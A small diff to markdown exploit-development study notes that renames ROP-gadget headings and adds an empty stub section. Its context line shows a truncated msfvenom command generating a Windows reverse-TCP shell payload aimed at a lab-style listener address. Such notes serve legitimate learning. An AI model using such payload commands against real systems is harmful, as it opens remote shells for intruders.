@@ -34,7 +34,7 @@ msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.6
 
 * It could be due to bad characters. There is a method to find bad characters.
 
-## Finding ROP in windows immunity debugger
+## ROP Gadgets
 
 * Different types of ROP gadgets. Depending on the ROP gadget we decide the payload format.
   * JMP ESP
@@ -99,7 +99,11 @@ RET
 
 * "ctrl + l" to find the next search result.
 
-## Finding ROP in linux
+### Finding ROP in linux
 
 * \(Refer linux exploit development\)
+
+### Finding ROP gadgets in immunity debugger
+
+* f
 
